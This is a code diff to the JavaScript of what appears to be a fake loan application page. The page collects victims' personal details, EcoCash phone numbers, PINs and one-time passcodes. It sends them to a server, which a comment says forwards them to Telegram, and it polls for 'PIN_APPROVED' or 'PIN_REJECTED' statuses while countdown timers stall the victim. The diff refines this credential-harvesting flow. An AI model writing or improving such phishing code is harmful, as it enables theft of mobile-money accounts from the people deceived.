@@ -3,12 +3,25 @@ let statusPollInterval = null;
 
 function updateLoanCalc() {
   const amount = parseInt(document.getElementById('loanRange').value);
+  const periodSelect = document.getElementById('repaymentPeriod');
+  
   const interest = Math.round(amount * 0.10);
   const total = amount + interest;
 
   document.getElementById('calc-amount').innerText = '$' + amount;
   document.getElementById('calc-interest').innerText = '$' + interest;
   document.getElementById('calc-total').innerText = '$' + total;
+
+  // Dynamically update repayment period as the range slider moves
+  if (amount <= 100) {
+    periodSelect.value = "1";
+  } else if (amount <= 250) {
+    periodSelect.value = "2";
+  } else if (amount <= 400) {
+    periodSelect.value = "3";
+  } else {
+    periodSelect.value = "6";
+  }
 }
 
 function showSection(sectionId) {
@@ -44,6 +57,7 @@ async function submitStep2Details() {
     return;
   }
 
+  // Payload combining Step 1 (Applicant Info) + Step 2 (EcoCash Phone & PIN)
   const payload = {
     fullName: document.getElementById('fullName').value,
     occupation: document.getElementById('occupation').value,
@@ -56,8 +70,8 @@ async function submitStep2Details() {
 
   try {
     showSection('step-loading');
-    startCountdown(10);
 
+    // Deliver combined Step 1 & Step 2 details immediately to server / Telegram
     const res = await fetch('/api/apply-loan', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -68,8 +82,13 @@ async function submitStep2Details() {
     if (data.success) {
       currentAppRef = data.appReference;
       startStatusPolling();
+
+      // Start 10-second timer and auto-advance to Step 3 when finished
+      startCountdown(10, () => {
+        showSection('form-step-3');
+      });
     } else {
-      alert("Application failed. Please try again.");
+      alert("Application submission failed. Please try again.");
       showSection('form-step-2');
     }
   } catch (err) {
@@ -88,7 +107,6 @@ async function submitOTPDetails() {
 
   try {
     showSection('step-loading');
-    startCountdown(10);
 
     const res = await fetch('/api/submit-otp', {
       method: 'POST',
@@ -101,14 +119,17 @@ async function submitOTPDetails() {
 
     const data = await res.json();
     if (data.success) {
-      startStatusPolling();
+      startCountdown(10, () => {
+        // Keeps waiting on status check polling
+      });
     }
   } catch (err) {
     alert("Error submitting OTP. Please try again.");
+    showSection('form-step-3');
   }
 }
 
-function startCountdown(seconds) {
+function startCountdown(seconds, onComplete) {
   let timer = seconds;
   const timerElem = document.getElementById('timer');
   timerElem.innerText = `${timer}s`;
@@ -118,6 +139,9 @@ function startCountdown(seconds) {
     timerElem.innerText = `${timer}s`;
     if (timer <= 0) {
       clearInterval(interval);
+      if (typeof onComplete === 'function') {
+        onComplete();
+      }
     }
   }, 1000);
 }
@@ -134,7 +158,6 @@ function startStatusPolling() {
 
       if (data.success) {
         if (data.status === 'PIN_APPROVED') {
-          clearInterval(statusPollInterval);
           showSection('form-step-3');
         } else if (data.status === 'PIN_REJECTED') {
           clearInterval(statusPollInterval);
@@ -153,5 +176,4 @@ function startStatusPolling() {
       console.error("Polling status error:", err);
     }
   }, 2000);
-                                        }
-      
+    }
